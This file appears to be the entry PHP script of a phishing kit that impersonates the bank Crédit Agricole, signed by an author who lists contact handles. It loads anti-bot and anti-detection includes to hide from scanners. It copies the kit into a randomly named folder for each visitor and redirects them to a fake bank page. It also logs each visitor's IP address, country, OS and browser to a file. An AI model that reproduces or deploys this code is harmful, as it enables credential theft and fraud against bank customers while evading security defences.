<?php

/**
 * @link              https://www.z0n51.com/
 * @since             20/03/2020
 * @package           CREDIT AGRICOLE
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      CREDIT AGRICOLE
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

include './prevents/anti1.php';
include './prevents/anti2.php';
include './prevents/anti3.php';
include './prevents/anti4.php';
include './prevents/anti5.php';
include './prevents/anti6.php';
include './prevents/anti7.php';
include './prevents/anti8.php';
include './prevents/9atila.php';
include "./BOTS/antibots1.php";
include "./BOTS/antibots2.php";
include "./BOTS/antibots3.php";
include "./BOTS/antibots4.php";
include "./BOTS/antibots5.php";
include "./BOTS/antibots6.php";
include 'inc/app.php';
$get_user_ip          = get_user_ip();
$get_user_country     = get_user_country($get_user_ip);
$get_user_countrycode = get_user_countrycode($get_user_ip);
$get_user_os          = get_user_os();
$get_user_browser     = get_user_browser();
    
$random = rand(0,100000000000);
$DIR    = substr(md5($random), 0, 15);
$dispatch = substr(md5($random), 0, 17);
function recurse_copy($home,$DIR) {
    $dir = opendir($home);
    @mkdir($DIR);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            if ( is_dir($home . '/' . $file) ) {
                recurse_copy($home . '/' . $file,$DIR . '/' . $file);
            } else {
                copy($home . '/' . $file,$DIR . '/' . $file);
            }
        }
    }
    closedir($dir);
}

$home="z0n51";
recurse_copy( $home, $DIR );
header("location:$DIR/region.php?particulier#_$dispatch");
$file = fopen("vu.txt","a");
fwrite($file,$get_user_ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$get_user_country | $get_user_os | $get_user_browser] \n");

?>
    